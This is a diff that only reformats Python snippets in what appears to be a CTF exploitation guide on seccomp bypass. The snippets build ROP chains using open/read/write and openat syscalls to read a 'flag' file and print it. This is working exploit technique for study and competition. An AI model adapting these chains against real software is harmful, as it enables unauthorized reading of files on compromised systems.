@@ -101,23 +101,23 @@ When `execve` is blocked but `open`/`read`/`write` are allowed:
 
 ```python
 # Build ROP chain for: open("flag") → read(fd, buf, size) → write(1, buf, size)
-rop = b''
+rop = b""
 # open("flag", O_RDONLY)
 rop += p64(pop_rdi) + p64(flag_str_addr)
-rop += p64(pop_rsi) + p64(0)           # O_RDONLY
-rop += p64(pop_rax) + p64(2)           # SYS_open
+rop += p64(pop_rsi) + p64(0)  # O_RDONLY
+rop += p64(pop_rax) + p64(2)  # SYS_open
 rop += p64(syscall_ret)
 # read(3, buf, 0x100) — fd=3 (first opened file)
 rop += p64(pop_rdi) + p64(3)
 rop += p64(pop_rsi) + p64(buf_addr)
 rop += p64(pop_rdx) + p64(0x100)
-rop += p64(pop_rax) + p64(0)           # SYS_read
+rop += p64(pop_rax) + p64(0)  # SYS_read
 rop += p64(syscall_ret)
 # write(1, buf, 0x100)
-rop += p64(pop_rdi) + p64(1)           # stdout
+rop += p64(pop_rdi) + p64(1)  # stdout
 rop += p64(pop_rsi) + p64(buf_addr)
 rop += p64(pop_rdx) + p64(0x100)
-rop += p64(pop_rax) + p64(1)           # SYS_write
+rop += p64(pop_rax) + p64(1)  # SYS_write
 rop += p64(syscall_ret)
 ```
 
@@ -149,10 +149,10 @@ flag_path: .ascii "flag\x00"
 ```python
 # SYS_openat(AT_FDCWD, "flag", O_RDONLY)
 # AT_FDCWD = -100 (0xffffffffffffff9c)
-rop += p64(pop_rdi) + p64(0xffffffffffffff9c)  # AT_FDCWD
+rop += p64(pop_rdi) + p64(0xFFFFFFFFFFFFFF9C)  # AT_FDCWD
 rop += p64(pop_rsi) + p64(flag_str_addr)
 rop += p64(pop_rdx) + p64(0)
-rop += p64(pop_rax) + p64(257)                  # SYS_openat
+rop += p64(pop_rax) + p64(257)  # SYS_openat
 rop += p64(syscall_ret)
 ```
 
